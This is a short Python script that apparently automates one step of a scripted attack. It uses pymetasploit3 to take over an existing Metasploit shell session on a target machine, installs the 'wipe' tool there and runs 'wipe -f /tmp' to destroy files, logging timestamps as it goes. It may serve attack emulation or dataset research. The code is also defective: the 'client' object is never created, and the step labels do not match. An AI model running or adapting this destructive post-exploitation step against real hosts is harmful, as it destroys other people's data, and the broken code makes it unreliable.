import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    wipe_disk_folder = "/tmp"

    

    # start step 7
    output_time_file_start = 'time_step_6_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    try:
        shell = client.sessions.session('3')
        shell.write('apt install wipe -y')
        time.sleep(30)
        shell.write("wipe -f {0}".format(wipe_disk_folder))
    except Exception as e:
        print(e)
        pass

    time.sleep(30)


main(sys.argv)
